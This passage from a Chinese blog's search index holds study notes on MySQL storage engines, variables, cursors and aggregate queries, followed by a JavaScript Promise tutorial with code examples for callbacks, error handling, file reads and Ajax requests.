engines;\n\n\n\n引擎介绍InnoDB引擎\n具备外键支持功能的事务存储引擎\n\n\nInnoDB支持事务，可以保证事务的完整提交和回滚\n频繁更新、删除操作，应优先选择InnoDB\n数据文件结构：\n表名.frm：表结构（MySQL8.0时，合并在表名.ibd中）\n表名.ibd：存储数据和索引\n\n\n对比MyISAM的存储索引，InnodDB的读写效率差一些，并且会占用更多的磁盘空间以保存数据和索引。\n\nMyISAM引擎\n主要的非事务处理存储引擎\n\n\nMyISAM提供全文索引、压缩、空间函数(GIS)等，但不支持事务、行级锁、外键，有一个毫无疑问的缺陷是崩溃后无法安全恢复。\n访问速度块，对事务完整性没有要求、或者以查询、插入为主的应用\n针对数据统计由额外的常数存储，故count(*)效率很高\n数据文件结构：\n表名.frm：存储表结构\n表名.MYD：存储数据（MYData）\n表名.MYI：存储索引（MYIndex）\n\n\n\nInnoDB和MySQL对比\nArchive引擎\n用于数据归档\n\n\n仅支持插入和查询两种功能（行被插入后不能再修改）\n具有很好压缩机制，使用zlib压缩裤\n采用行级锁\n适合存储大量的独立的作为历史记录的数据，拥有很高的插入速度，但是对查询的支持较差。\n\nBlackhole引擎\n丢弃写操作，读操作会返回空内容\n\nCSV引擎\n存储数据时，以逗号分割各个数据项\n\n\n可以将普通的csv文件作为MySQL的表来处理，但不支持索引\n可以作为一种数据交换的机制\n\nMemory引擎\n置于内存的表\n\n\n采用的逻辑介质时内存，响应速度很快\n当时当mysqld守护进程崩溃的时候，数据会丢失\n使用场景：目标数据较小，频繁的访问，数据是临时的\n\nFederated引擎\n访问远程表\n\n\n是访问其他MySQL服务器的一个代理。\n\nMerge引擎\n管理多个MyISAM表构成的表集合\n\nNDB引擎\nMySQL集群专用存储引擎\n\n","categories":["MySQL"],"tags":["存储引擎"]},{"title":"MySQL（十）：变量、流程控制与游标","url":"/2023/02/09/MySQL%EF%BC%88%E5%8D%81%EF%BC%89%EF%BC%9A%E5%8F%98%E9%87%8F%E3%80%81%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B8%8E%E6%B8%B8%E6%A0%87/","content":"变量系统变量\n由系统定义，属于服务器层面。\n系统变量：\n全局系统变量（global）：针对于所有会话（连接）有效，但不能跨重启\n会话系统变量（session)：仅针对当前会话有效。会话期间，当前会话对某个会话系统变量值的修改，不会影响其他会话同一个会话系统变量的值。\n\n\n\nSHOW GLOBAL VARIABLES;SHOW SESSION VARIABLES;SHOW VARIABLES;#默认是会话系统变量SELECT @@global.max_connections;SELECT @@session.character_set_client;SELECT @@character_set_client; #先查询会话系统变量，再查询全局系统变量SET @@global.max_connections = 161;SET GLOBAL max_connections = 171;\n\n用户变量\n用户变量：\n会话用户变量：使用@开头，只对当前连接会话有效\n局部变量：只在BEGIN和END语句块中有效。只能在存储过程和存储函数中使用。\n\n\n\n# 会话用户变量SET @m1 = 1;SET @m2 := 2;SET @sum := @m1 + @m2;SELECT AVG(salary) INTO @avg_sal FROM employees;#局部变量DELIMITER //CREATE PROCEDURE test_var()BEGIN\tDECLARE a INT DEFAULT 0;\tDECLARE b INT;\tDECLARE emp_name VARCHAR(25);\tSET a = 1;\tSET b := 2;\tSELECT last_name INTO emp_name FROM employees WHERE employee_id = 101;END //DELIMITER\n\n流程控制略\n游标\n对数据进行定位\n\nDECLARE //CREATE PROCEDURE get_count_by_limit_total_salary(IN limit_total_salary DOUBLE,OUT total_count INT)BEGIN\tDECLARE sum_sal DOUBLE DEFAULT 0.0;\tDECLARE emp_sal DOUBLE;\tDECLARE emp_count INT DEFAULT 0;\t# 声明游标\tDECLARE emp_cursor CURSOR FOR SELECT salary FROM employees ORDER BY salary DESC;\t# 打开游标\tOPEN emp_cursor;\tREPEAT        # 使用游标        FETCH emp_cursor INTO emp_sal;                SET sum_sal = sum_sal + emp_sal;        SET emp_count = emp_count + 1;        UNTILL sum_sal &gt;= limit_total_salary;    END REPEAT;        SET total_count = emp_count;    # 关闭游标    CLOSE emp_cursor;END //DELIMITER ;CALL get_count_by_limit_total_salary(200000,@total_count);\n\n","categories":["MySQL"],"tags":["变量","流程控制","游标"]},{"title":"MySQL（四）：函数","url":"/2023/02/08/MySQL%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E5%87%BD%E6%95%B0/","content":"数值函数基本函数\n字符串函数\n\n日期和时间函数获取日期、时间\n日期和时间戳的转换\n获取月份、星期、星期数、天数等\n日期的操作函数\n时间和秒钟转换的函数\n计算日期和时间的函数\n日期格式化与解析\n\n\n流程控制函数\n加密与解密函数\nMySQL信息函数\n聚合函数\n作用域一组数据，并返回一个值\n\n常见的几个聚合函数\nAVG\n\nSUM\n\nMAX\n\nMIN\n\nCOUNT：计算指定字段再查询结构中出现的个数（不包含NULL值）\nSELECT COUNT(employee_id),COUNT(1),COUNT(2),COUNT(*)    //107,107,107,107FROM employees;\n\n如何计算表中有多少条记录？\n\nCOUNT(*)\nCOUNT(1)\nCOUNT(具体字段)：不一定对，可能包含NULL\n\n哪个效率更高？\n\n如果使用的是MyISAM存储引擎，则三者效率相同，都是O(1)\n如果使用的是InnoDB存储引擎，则三者效率：COUNT(*) &#x3D; COUNT(1) &gt; COUNT(字段)\n\n\n\nGROUP BYSELECT department_id,AVG(salary)FROM employeesGROUP BY department_id;SELECT job_id,AVG(salary)FROM employeesGROUP BY job_id;SELECT department_id,job_id,AVG(salary)FROM employeesGROUP BY department_id,job_id;#错误写法SELECT department_id,job_id,AVG(salary)FROM employeesGROUP BY department_id;\n\n\nSELECT中出现的非组函数的字段必须声明在GROUP BY中。反之，GROUP BY中声明的字段可以不出现在SELECT中。\nGROUP BY声明在FROM后面、WHERE后面、ORDER BY前面、LIMIT前面\n\nHAVING\n作用：用来过滤数据的\n如果过滤条件中使用了聚合函数，则必须使用HAVING来替换WHERE，否则会报错。\nHAVING必须声明在GROUP BY的后面\n\n# 查询各个部门中最高工资比10000高的部门信息SELECT department_id,MAX(salary)FROM employeesGROUP BY department_idHAVING MAX(salary) &gt; 10000;# 查询各个部门id为10，20，30，40中最高工资比10000高的部门信息# 方式一：推荐，执行效率高于方式二SELECT department_id,MAX(salary)FROM employeesWHERE department_id IN (10,20,30,40)GROUP BY department_idHAVING MAX(salary) &gt; 10000;# 方式二：SELECT department_id,MAX(salary)FROM employeesGROUP BY department_idHAVING MAX(salary) &gt; 10000 AND department_id IN (10,20,30,40);\n\n\n当过滤条件中有聚合函数时，则此过滤添加必须声明在HAVING中\n当过滤条件中没有聚合函数时，则此过滤条件声明在WHERE中或HAVING中都可以，但建议声明在WHERE中。\n\n\nSQL底层执行原理SELECT语句的完整结构# sql92SELECT ...,...,...(存在聚合函数)FROM ...,...,...WHERE 多表的连接条件 AND 不包含聚合函数的过滤条件GROUP BY ...,...HAVING 包含聚合函数的过滤条件ORDER BY ...,...(ASC / DESC)LIMIT ...,...# sql99SELECT ...,...,...(存在聚合函数)FROM ... (LEFT / RIGHT)JOIN ...ON 多表的连接条件JOIN ...ON 多表的连接条件WHERE 不包含聚合函数的过滤条件GROUP BY ...,...HAVING 包含聚合函数的过滤条件ORDER BY ...,...(ASC / DESC)LIMIT ...,...\n\nSQL语句的执行过程\n\nFROM –&gt; ON –&gt; (LEFT \\ RIGNT JOIN) –&gt; WHERE –&gt; GROUP BY –&gt; HAVING –&gt; SELECT –&gt;DISTINCT —&gt; ORDER BY –&gt; LIMIT\nWHERE效率大于HAVING：WHERE在分组前先筛选掉了一部分数据，降低了后续HAVING操作的数据量。\n\n","categories":["MySQL"],"tags":["函数"]},{"title":"Promise（一）：入门","url":"/2022/04/21/Promise%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%85%A5%E9%97%A8/","content":"1. 预备知识1.1 实例对象与函数对象\n实例对象：new 函数产生的对象，称为实例对象，简称为对象\n函数对象：将函数作为对象使用时，称为函数对象\n\nfunction Fn() &#123; // Fn只能称为函数&#125;const fn = new Fn() // Fn只有new过的才可以称为构造函数//fn称为实例对象console.log(Fn.prototype)// Fn作为对象使用时，才可以称为函数对象Fn.bind(&#123;&#125;) //Fn作为函数对象使用$(&#x27;#test&#x27;) // $作为函数使用$.get(&#x27;/test&#x27;) // $作为函数对象使用\n\n\n()左边是函数，点左边是对象(函数对象、实例对象)\n\n1.2 两种类型的回调函数1. 同步回调\n立即执行，完全执行完了才结束，不会放入回调队列中\n\n数组遍历相关的回调 &#x2F; Promise的executor函数\nconst arr = [1, 3, 5];arr.forEach(item =&gt; &#123; // 遍历回调，同步回调，不会放入队列，一上来就要执行  console.log(item);&#125;)console.log(&#x27;forEach()之后&#x27;)\n\n\n2. 异步回调\n不会立即执行，会放入回调队列中将来执行\n\n定时器回调 &#x2F; ajax回调 &#x2F; Promise成功或失败的回调\n// 定时器回调setTimeout(() =&gt; &#123; // 异步回调，会放入队列中将来执行  console.log(&#x27;timeout callback()&#x27;)&#125;, 0)console.log(&#x27;setTimeout()之后&#x27;)\n\n\n// Promise 成功或失败的回调new Promise((resolve, reject) =&gt; &#123;  resolve(1)&#125;).then(  value =&gt; &#123;console.log(&#x27;value&#x27;, value)&#125;,  reason =&gt; &#123;console.log(&#x27;reason&#x27;, reason)&#125;)console.log(&#x27;----&#x27;)// ----// value 1\n\n\njs 引擎先把初始化的同步代码都执行完成后，才执行回调队列中的代码\n\n1.3 JS中的异常error处理1. 错误的类型Error：所有错误的父类型\nReferenceError：引用的变量不存在\nconsole.log(a) // ReferenceError:a is not defined\n\nTypeError：数据类型不正确\nlet bconsole.log(b.xxx)// TypeError:Cannot read property &#x27;xxx&#x27; of undefinedlet c = &#123;&#125;c.xxx()// TypeError:c.xxx is not a function\n\nRangeError：数据值不在其所允许的范围内\nfunction fn() &#123;  fn()&#125;fn()// RangeError:Maximum call stack size exceeded\n\nSyntaxError：语法错误\nconst c = &quot;&quot;&quot;&quot;// SyntaxError:Unexpected string\n\n2. 错误处理（捕获与抛出）抛出错误：throw error\nfunction something() &#123;  if (Date.now()%2===1) &#123;    console.log(&#x27;当前时间为奇数，可以执行任务&#x27;)  &#125; else &#123; //如果时间为偶数抛出异常，由调用来处理    throw new Error(&#x27;当前时间为偶数，无法执行任务&#x27;)  &#125;&#125;\n\n捕获错误：try ... catch\n// 捕获处理异常try &#123;  something()&#125; catch (error) &#123;  alert(error.message)&#125;\n\n3. 错误对象\nmassage 属性：错误相关信息\nstack 属性：函数调用栈记录信息\n\ntry &#123;  let d  console.log(d.xxx)&#125; catch (error) &#123;  console.log(error.message)  console.log(error.stack)&#125;console.log(&#x27;出错之后&#x27;)// Cannot read property &#x27;xxx&#x27; of undefined// TypeError:Cannot read property &#x27;xxx&#x27; of undefined// 出错之后\n\n\n因为错误被捕获处理了，后面的代码才能运行下去，打印出‘出错之后’\n\n2. Promise的理解和使用2.1 Promise是什么1. 理解Promise\n抽象表达：Promise是JS中进行异步编程的新的解决方案(旧方案是单纯使用回调函数)\n[推荐阅读 js中的同步和异步的个人理解 、【JavaScript】同步与异步-异步与并行-异步运行机制-为什么要异步编程-异步与回调-回调地狱-JavaScript中的异步操作】\n—- 异步编程 ①fs 文件操作 ②数据库操作 ③Ajax ④定时器\n\n具体表达：\n①从语法上看：Promise是一个构造函数，可进行对象的实例化 (自己身上有all、reject、resolve这几个方法，原型上有then、catch等方法)\n②从功能上看：promise对象用来封装一个异步操作并可以获取其成功&#x2F;失败的结果值\n\n阮一峰的解释：\n所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果\n从语法上说，Promise 是一个对象，从它可以获取异步操作的消息\nPromise 提供统一的 API，各种异步操作都可以用同样的方法进行处理\n\n\n2. Promise 的状态实例对象promise中的一个属性 PromiseState\nPromiseState的值可以为：pending 未决定的（最开始的状态）、resolved &#x2F; fullfilled 成功、rejected 失败\n\npending 变为 resolved&#x2F;fullfilled\npending 变为 rejected\n\n注意\n\n对象的状态不受外界影响\n只有这两种改变方式（反过来不行），且一个 promise 对象只能改变一次\n一旦状态改变，就不会再变，任何时候都可以得到这个结果\n无论成功还是失败，都会有一个结果数据。成功的结果数据一般称为 value，而失败的一般称为 reason。\n\n3. Promise对象的值实例对象promise的另一个属性 PromiseResult保存着对象（异步任务）成功&#x2F;失败 的值（value&#x2F;reason）\nresolve&#x2F;reject可以修改值\n4. Promise 的基本流程\n\n若状态为resolved，则调用then()方法中的第一个回调函数\n若状态为rejected，则调用then()方法中的第二个回调函数\n\n5. Promise 的基本使用const promise = new Promise(function(resolve, reject) &#123;  // ... some code  if (/* 异步操作成功 */)&#123;    resolve(value);  &#125; else &#123;    reject(reason);  &#125;&#125;);\n\nPromise构造函数接受一个函数（执行器函数）作为参数，该函数的两个参数分别是resolve和reject。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。\nresolve函数的作用是，将Promise对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved），在异步操作成功时调用，并将异步操作的结果，作为参数value传递出去；reject函数的作用是，将Promise对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected），在异步操作失败时调用，并将异步操作报出的错误，作为参数error/reason传递出去。\nPromise实例生成以后，可以用then方法分别指定resolved状态和rejected状态的回调函数。\npromise.then(function(value) &#123;  // success&#125;, function(reason) &#123;  // failure&#125;);\n\nthen方法可以接受两个回调函数作为参数。第一个回调函数onResolved()是Promise对象的状态变为resolved时调用第二个回调函数onRejected()是Promise对象的状态变为rejected时调用这两个函数都是可选的，不一定要提供。它们都接受Promise对象传出的值作为参数\n\n一个例子\n// 创建一个新的p对象promiseconst p = new Promise((resolve, reject) =&gt; &#123; // 执行器函数  // 执行异步操作任务  setTimeout(() =&gt; &#123;    const time = Date.now()     // 如果当前时间是偶数代表成功，否则失败    if (time % 2 == 0) &#123;      // 如果成功，调用resolve(value)      resolve(&#x27;成功的数据，time=&#x27; + time)    &#125; else &#123;      // 如果失败，调用reject(reason)      reject(&#x27;失败的数据，time=&#x27; + time)    &#125;  &#125;, 1000);&#125;)p.then(  value =&gt; &#123; // 接收得到成功的value数据 onResolved    console.log(&#x27;成功的回调&#x27;, value)  // 成功的回调 成功的数据，time=1615015043258  &#125;,  reason =&gt; &#123; // 接收得到失败的reason数据 onRejected    console.log(&#x27;失败的回调&#x27;, reason)    // 失败的回调 失败的数据，time=1615014995315  &#125;)\n\n\n.then() 和执行器(executor)同步执行，.then() 中的回调函数异步执行\n\n\n\n2.2 为什么要用 Promise1.指定回调函数的方式更加灵活旧的：必须在启动异步任务前指定\n// 1. 纯回调的形式// 成功的回调函数function successCallback(result) &#123;  console.log(&quot;声音文件创建成功：&quot; + result);&#125;// 失败的回调函数function failureCallback(error) &#123;  console.log(&quot;声音文件创建失败：&quot; + error);&#125;// 必须先指定回调函数，再执行异步任务createAudioFileAsync(audioSettings, successCallback, failureCallback) // 回调函数在执行异步任务（函数）前就要指定\n\npromise：启动异步任务 &#x3D;&gt; 返回promise对象 &#x3D;&gt; 给promise对象绑定回调函数(甚至可以在异步任务结束后指定)\n// 2. 使用Promiseconst promise = createAudioFileAsync(audioSettings);  // 执行2秒setTimeout(() =&gt; &#123;  promise.then(successCallback, failureCallback) // 也可以获取&#125;, 3000);\n\n2.支持链式调用，可以解决回调地狱问题什么是回调地狱？\n回调函数嵌套调用，外部回调函数异步执行的结果是其内部嵌套的回调函数执行的条件\n\ndoSomething(function(result) &#123;  doSomethingElse(result, function(newResult) &#123;    doThirdThing(newResult, function(finalResult) &#123;      console.log(&#x27;Got the final result:&#x27; + finalResult)    &#125;, failureCallback)  &#125;, failureCallback)&#125;, failureCallback)\n\n回调地狱的缺点？\n不便于阅读\n不便于异常处理\n\n解决方案？\npromise 链式调用\n\n使用 promise 的链式调用解决回调地狱\ndoSomething()  .then(result =&gt; doSomethingElse(result))  .then(newResult =&gt; doThirdThing(newResult))  .then(finalResult =&gt; &#123;console.log(&#x27;Got the final result:&#x27; + finalResult)&#125;)  .catch(failureCallback)\n\n2.3 Promise初体验1.抽奖案例使用传统回调函数实现&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;基本使用&lt;/title&gt;    &lt;link crossorigin=&#x27;anonymous&#x27; href=&quot;https://cdn.bootcss.com/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h2 class=&quot;page-header&quot;&gt;Promise 初体验&lt;/h2&gt;        &lt;button class=&quot;btn btn-primary&quot; id=&quot;btn&quot;&gt;点击抽奖&lt;/button&gt;    &lt;/div&gt;    &lt;script&gt;        //生成随机数        function rand(m,n)&#123;            return Math.ceil(Math.random() * (n-m+1)) + m-1;        &#125;        /**            点击按钮,  1s 后显示是否中奖(30%概率中奖)                若中奖弹出    恭喜恭喜, 奖品为 10万 RMB 劳斯莱斯优惠券                若未中奖弹出  再接再厉        */        //获取元素对象        const btn = document.querySelector(&#x27;#btn&#x27;);        //绑定单击事件        btn.addEventListener(&#x27;click&#x27;, function()&#123;            //定时器            setTimeout(() =&gt; &#123;                //30%  1-100  1 2 30                //获取从1 - 100的一个随机数                let n = rand(1, 100);                //判断                if(n &lt;= 30)&#123;                    alert(&#x27;恭喜恭喜, 奖品为 10万 RMB 劳斯莱斯优惠券&#x27;);                &#125;else&#123;                    alert(&#x27;再接再厉&#x27;);                &#125;            &#125;, 1000);        &#125;);    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n使用Promise实现&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;基本使用&lt;/title&gt;    &lt;link crossorigin=&#x27;anonymous&#x27; href=&quot;https://cdn.bootcss.com/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h2 class=&quot;page-header&quot;&gt;Promise 初体验&lt;/h2&gt;        &lt;button class=&quot;btn btn-primary&quot; id=&quot;btn&quot;&gt;点击抽奖&lt;/button&gt;    &lt;/div&gt;    &lt;script&gt;        //生成随机数        function rand(m,n)&#123;            return Math.ceil(Math.random() * (n-m+1)) + m-1;        &#125;        /**            点击按钮,  1s 后显示是否中奖(30%概率中奖)                若中奖弹出    恭喜恭喜, 奖品为 10万 RMB 劳斯莱斯优惠券                若未中奖弹出  再接再厉        */        //获取元素对象        const btn = document.querySelector(&#x27;#btn&#x27;);        //绑定单击事件        btn.addEventListener(&#x27;click&#x27;, function()&#123;            //Promise 形式实现            // resolve 解决  函数类型的数据            // reject  拒绝  函数类型的数据            const p = new Promise((resolve, reject) =&gt; &#123;                setTimeout(() =&gt; &#123;                    //30%  1-100  1 2 30                    //获取从1 - 100的一个随机数                    let n = rand(1, 100);                    //判断                    if(n &lt;= 30)&#123;                        resolve(n); // 将 promise 对象的状态设置为 『成功』                    &#125;else&#123;                        reject(n); // 将 promise 对象的状态设置为 『失败』                    &#125;                &#125;, 1000);            &#125;);            console.log(p);            //调用 then 方法            // value 值            // reason 理由            p.then((value) =&gt; &#123;                alert(&#x27;恭喜恭喜, 奖品为 10万 RMB 劳斯莱斯优惠券, 您的中奖数字为 &#x27; + value);            &#125;, (reason) =&gt; &#123;                alert(&#x27;再接再厉, 您的号码为 &#x27; + reason);            &#125;);        &#125;);    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n2.fs读取文件使用传统回调函数实现const fs = require(&#x27;fs&#x27;);//回调函数 形式fs.readFile(&#x27;./resource/content.txt&#x27;, (err, data) =&gt; &#123;    // 如果出错 则抛出错误    if(err)  throw err;    //输出文件内容    console.log(data.toString());&#125;);\n\n使用Promise实现const fs = require(&#x27;fs&#x27;);//Promise 形式let p = new Promise((resolve , reject) =&gt; &#123;    fs.readFile(&#x27;./resource/content.tx&#x27;, (err, data) =&gt; &#123;        //如果出错        if(err) reject(err);        //如果成功        resolve(data);    &#125;);&#125;);//调用 then p.then(value=&gt;&#123;    console.log(value.toString());&#125;, reason=&gt;&#123;    console.log(reason);&#125;);\n\n3.Ajax请求使用传统方式实现//接口地址 https://api.apiopen.top/getJokebtn.addEventListener(&#x27;click&#x27;, function()&#123;    //1.创建对象    const xhr = new XMLHttpRequest();    //2. 初始化    xhr.open(&#x27;GET&#x27;, &#x27;https://api.apiopen.top/getJoke&#x27;);    //3. 发送    xhr.send();    //4. 处理响应结果    xhr.onreadystatechange = function()&#123;        if(xhr.readyState === 4)&#123;            //判断响应状态码 2xx               if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300)&#123;                //控制台输出响应体                resolve(xhr.response);            &#125;else&#123;                //控制台输出响应状态码                reject(xhr.status);            &#125;        &#125;    &#125;&#125;);\n\n使用Promise实现//接口地址 https://api.apiopen.top/getJokebtn.addEventListener(&#x27;click&#x27;, function()&#123;    //创建 Promise    const p = new Promise((resolve, reject) =&gt; &#123;        //1.创建对象        const xhr = new XMLHttpRequest();        //2. 初始化        xhr.open(&#x27;GET&#x27;, &#x27;https://api.apiopen.top/getJoke&#x27;);        //3. 发送        xhr.send();        //4. 处理响应结果        xhr.onreadystatechange = function()&#123;            if(xhr.readyState === 4)&#123;                //判断响应状态码 2xx                   if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300)&#123;                    //控制台输出响应体                    resolve(xhr.response);                &#125;else&#123;                    //控制台输出响应状态码                    reject(xhr.status);                &#125;            &#125;        &#125;    &#125;);    //调用then方法    p.then(value=&gt;&#123;        console.log(value);    &#125;, reason=&gt;&#123;        console.warn(reason);    &#125;);&#125;);\n\n4. Promise封装fs读取文件操作/** * 封装一个函数 mineReadFile 读取文件内容 * 参数:  path  文件路径 * 返回:  promise 对象 */function mineReadFile(path)&#123;    return new Promise((resolve, reject) =&gt; &#123;        //读取文件        require(&#x27;fs&#x27;).readFile(path, (err, data) =&gt;&#123;            //判断            if(err) reject(err);            //成功            resolve(data);        &#125;);    &#125;);&#125;mineReadFile(&#x27;./resource/content.txt&#x27;).then(value=&gt;&#123;    //输出文件内容    console.log(value.toString());&#125;, reason=&gt;&#123;    console.log(reason);&#125;);\n\n5. util.promisify方法进行promise风格化\n将传统异步回调函数转化成Promise风格函数\n\n/** * util.promisify 方法 *///引入 util 模块const util = require(&#x27;util&#x27;);//引入 fs 模块const fs = require(&#x27;fs&#x27;);//返回一个新的函数let mineReadFile = util.promisify(fs.readFile);mineReadFile(&#x27;./resource/content.txt&#x27;).then(value=&gt;&#123;    console.log(value.toString());&#125;);\n\n6. Promise封装Ajax请求/*** 封装一个函数 sendAJAX 发送 GET AJAX 请求* 参数   URL* 返回结果 Promise 对象*/function sendAJAX(url)&#123;    return new Promise((resolve, reject) =&gt; &#123;        const xhr = new XMLHttpRequest();        xhr.responseType = &#x27;json&#x27;;        xhr.open(&quot;GET&quot;, url);        xhr.send();        //处理结果        xhr.onreadystatechange = function()&#123;            if(xhr.readyState === 4)&#123;                //判断成功                if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300)&#123;                    //成功的结果                    resolve(xhr.response);                &#125;else&#123;                    reject(xhr.status);                &#125;            &#125;        &#125;    &#125;);&#125;sendAJAX(&#x27;https://api.apiopen.top/getJok&#x27;).then(value =&gt; &#123;    console.log(value);&#125;, reason =&gt; &#123;    console.warn(reason);&#125;);\n\n\n\n2.4 如何使用 Promise （API）1. Promise 构造函数：Promise(executor) &#123;&#125;\nexecutor 函数：同步调用 (resolve, reject) &#x3D;&gt; {}  \n\nresolve 函数：内部定义成功时调用的函数 resove(value)\n\nreject 函数：内部定义失败时调用的函数 reject(reason)\n\n\n说明：executor 是执行器，会在 Promise 内部立即同步回调（即代码运行到时立即执行），异步操作 resolve&#x2F;reject 就在 executor 中执行\nlet p = new Promise((resolve,reject) =&gt; &#123;    console.log(111);&#125;);console.log(222);//先输出111//再输出222\n\n2. Promise.prototype.then 方法：p.then(onResolved, onRejected)指定两个回调（成功+失败）\n\nonResolved 函数：成功的回调函数 (value) &#x3D;&gt; {}\nonRejected 函数：失败的回调函数 (reason) &#x3D;&gt; {}\n\n说明：指定用于得到成功 value 的成功回调和用于得到失败 reason 的失败回调，返回一个新的 promise 对象\n3. Promise.prototype.catch 方法：p.catch(onRejected)指定失败的回调\n1）onRejected 函数：失败的回调函数 (reason) =&gt; &#123;&#125;\n说明：这是then() 的语法糖，相当于 then(undefined, onRejected)\nnew Promise((resolve, reject) =&gt; &#123; // excutor执行器函数 setTimeout(() =&gt; &#123;   if(...) &#123;     resolve(&#x27;成功的数据&#x27;) // resolve()函数   &#125; else &#123;      reject(&#x27;失败的数据&#x27;) //reject()函数    &#125; &#125;, 1000)&#125;).then(value =&gt; &#123; // onResolved()函数      console.log(value) // 成功的数据    &#125;).catch(reason =&gt; &#123; // onRejected()函数      console.log(reason) // 失败的数据    &#125;)\n\n4. Promise.resolve 方法：Promise.resolve(value)value：将被 Promise 对象解析的参数，也可以是一个成功或失败的 Promise 对象\n返回：返回一个带着给定值解析过的 Promise 对象，如果参数本身就是一个 Promise 对象，则直接返回这个 Promise 对象。（返回结果可能是成功的对象，也可能是失败的对象）\n\n如果传入的参数为 非Promise类型的对象, 则返回的结果为成功promise对象\n\nlet p1 = Promise.resolve(521);console.log(p1); // Promise &#123;&lt;fulfilled&gt;: 521&#125;\n\n\n\n如果传入的参数为 Promise 对象, 则参数的结果决定了 resolve 的结果\nlet p2 = Promise.resolve(new Promise((resolve, reject) =&gt; &#123;    // resolve(&#x27;OK&#x27;); // 成功的Promise    reject(&#x27;Error&#x27;);&#125;));console.log(p2);p2.catch(reason =&gt; &#123;    console.log(reason);&#125;)\n\n\n\n\n5. Promise.reject 方法：Promise.resolve(reason)reason：失败的原因\n说明：返回一个失败的 promise 对象(返回结果一直都是失败的对象)\n失败值：传入什么就是什么\nlet p = Promise.reject(521);let p2 = Promise.reject(&#x27;iloveyou&#x27;);let p3 = Promise.reject(new Promise((resolve, reject) =&gt; &#123;    resolve(&#x27;OK&#x27;);&#125;));console.log(p);console.log(p2);console.log(p3);\n\n\n\nPromise.resolve()&#x2F;Promise.reject() 方法就是一个语法糖\n用来快速得到Promise对象\n\n//产生一个成功值为1的promise对象new Promise((resolve, reject) =&gt; &#123; resolve(1)&#125;)//相当于const p1 = Promise.resolve(1)const p2 = Promise.resolve(2)const p3 = Promise.reject(3)p1.then(value =&gt; &#123;console.log(value)&#125;) // 1p2.then(value =&gt; &#123;console.log(value)&#125;) // 2p3.catch(reason =&gt; &#123;console.log(reason)&#125;) // 3\n\n6. Promise.all 方法：Promise.all(iterable)iterable：包含 n 个 promise 的可迭代对象，如 Array 或 String\n说明：返回一个新的 promise，只有所有的 promise 都成功才成功，只要有一个失败了就直接失败\n成功值：每个promise成功结果组成的数组\n失败值：数组中失败promise的值（多个失败显式第一个失败值）\nlet p1 = new Promise((resolve, reject) =&gt; &#123;  resolve(&#x27;OK&#x27;);&#125;)let p2 = Promise.resolve(&#x27;Success&#x27;);let p3 = Promise.resolve(&#x27;Oh Yeah&#x27;);const result = Promise.all([p1, p2, p3]);console.log(result);\n\n\nlet p1 = new Promise((resolve, reject) =&gt; &#123;  resolve(&#x27;OK&#x27;);&#125;)let p2 = Promise.reject(&#x27;Error&#x27;);let p3 = Promise.resolve(&#x27;Oh Yeah&#x27;);const result = Promise.all([p1, p2, p3]);console.log(result);\n\n\nconst p1 = Promise.resolve(1)const p2 = Promise.resolve(2)const p3 = Promise.reject(3)const pAll = Promise.all([p1, p2, p3])const pAll2 = Promise.all([p1, p2])//因为其中p3是失败所以pAll失败pAll.then(value =&gt; &#123;   console.log(&#x27;all onResolved()&#x27;, value) &#125;,reason =&gt; &#123;   console.log(&#x27;all onRejected()&#x27;, reason)  &#125;)// all onRejected() 3pAll2.then(values =&gt; &#123;   console.log(&#x27;all onResolved()&#x27;, values) &#125;,reason =&gt; &#123;   console.log(&#x27;all onRejected()&#x27;, reason)  &#125;)// all onResolved() [1, 2]\n\n7. Promise.race方法：Promise.race(iterable)iterable：包含 n 个 promise 的可迭代对象，如 Array 或 String\n说明：返回一个新的 promise，第一个完成的 promise 的结果状态就是最终的结果状态谁先完成就输出谁(不管是成功还是失败)\nconst pRace = Promise.race([p1, p2, p3])// 谁先完成就输出谁(不管是成功还是失败)const p1 = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123;   resolve(1) &#125;, 1000)&#125;)const p2 = Promise.resolve(2)const p3 = Promise.reject(3)pRace.then(value =&gt; &#123;   console.log(&#x27;race onResolved()&#x27;, value) &#125;,reason =&gt; &#123;   console.log(&#x27;race onRejected()&#x27;, reason)  &#125;)//race onResolved() 2\n\nlet p1 = new Promise((resolve, reject) =&gt; &#123;  setTimeout(() =&gt; &#123;      resolve(&#x27;OK&#x27;);  &#125;, 1000);&#125;)let p2 = Promise.resolve(&#x27;Success&#x27;);let p3 = Promise.resolve(&#x27;Oh Yeah&#x27;);//调用const result = Promise.race([p1, p2, p3]);console.log(result);\n\n\n3. Promise 的几个关键问题1. 如何改变 promise 的状态？\n(1)resolve(value)：如果当前是 pending 就会变为 resolved &#x2F; fulfilled\n(2)reject(reason)：如果当前是 pending 就会变为 rejected\n(3) 抛出异常throw：如果当前是 pending 就会变为 rejected\n\nconst p = new Promise((resolve, reject) =&gt; &#123;  //resolve(1) // promise变为resolved成功状态  //reject(2) // promise变为rejected失败状态  throw new Error(&#x27;出错了&#x27;) // 抛出异常，promise变为rejected失败状态，reason为抛出的error&#125;)p.then(  value =&gt; &#123;&#125;,  reason =&gt; &#123;console.log(&#x27;reason&#x27;,reason)&#125;)// reason Error:出错了\n\n2. 一个 promise 